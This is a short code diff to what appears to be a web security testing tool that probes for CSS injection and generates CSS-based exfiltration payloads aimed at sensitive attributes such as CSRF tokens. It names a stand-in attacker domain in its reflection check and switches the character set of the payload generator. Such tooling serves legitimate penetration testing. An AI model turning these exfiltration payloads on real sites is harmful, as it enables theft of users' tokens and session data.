@@ -186,7 +186,7 @@ def detect_css_injection_surface(url: str, rate: float, dry_run: bool):
             if payload in body or payload.replace(":", "%3A") in body:
                 record(f"css-reflect-{param}-{name}", "VULNERABLE",
                        f"Payload reflected in body: ?{param}={payload[:60]}")
-            elif "attacker.example.com" in body:
+            elif re.search(r'(?<![.\w])attacker\.example\.com(?![.\w])', body):
                 record(f"css-reflect-{param}-{name}", "INTERESTING",
                        f"Attacker domain in response: ?{param}=...")
             elif status in (200, 201) and len(body) != len(baseline_body):
@@ -258,7 +258,7 @@ def generate_exfil_payloads(url: str, callback: str):
     print()
 
     for name, selector, attr in SENSITIVE_ATTRS:
-        payload = generate_css_exfil_payload(selector, attr, cb, chars="0123456789abcdef")
+        payload = generate_css_exfil_payload(selector, attr, cb, chars=CSRF_CHARS)
         print(f"  {CYAN}[{name}]{RESET} {selector}[{attr}]")
         # Show first 3 rules
         lines = payload.split("\n")
